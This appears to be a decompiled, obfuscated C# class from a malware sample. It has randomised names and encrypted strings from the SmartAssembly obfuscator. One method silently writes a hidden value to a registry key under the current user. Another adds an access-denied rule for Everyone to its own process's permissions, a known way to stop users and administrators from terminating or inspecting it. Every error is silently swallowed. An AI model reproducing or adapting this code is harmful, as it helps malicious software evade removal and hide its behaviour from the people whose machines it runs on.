using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KXfHkplBSblOeZ;

internal sealed class QbVoWdWNfYVfJa
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr WhquzqpRpWIzT, int CFDdCQvJtpQ, [Out] byte[] GtQJsrJCzSiV, uint JhxzzVrWiFNg, out uint JHmQzjXrvUUp);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr QCAdZxduTRU, int qCrgNrNztuf, [In] byte[] dRBYZYDKgsk);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void KeWMEcNvryPfrNG(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107405799)));
			registryKey.SetValue(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107405150)), getString_0(107406642));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor PyIoCAaQtNwi(IntPtr intptr_0)
	{
		byte[] gtQJsrJCzSiV = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, gtQJsrJCzSiV, 0u, out var JHmQzjXrvUUp);
		if ((long)JHmQzjXrvUUp > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, gtQJsrJCzSiV = new byte[JHmQzjXrvUUp], JHmQzjXrvUUp, out JHmQzjXrvUUp))
		{
			return null;
		}
		return new RawSecurityDescriptor(gtQJsrJCzSiV, 0);
	}

	private void aETOUabweYqidQ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void xLaaLHnxlsRXD()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = PyIoCAaQtNwi(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			aETOUabweYqidQ(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static QbVoWdWNfYVfJa()
	{
		Strings.CreateGetStringDelegate(typeof(QbVoWdWNfYVfJa));
	}
}
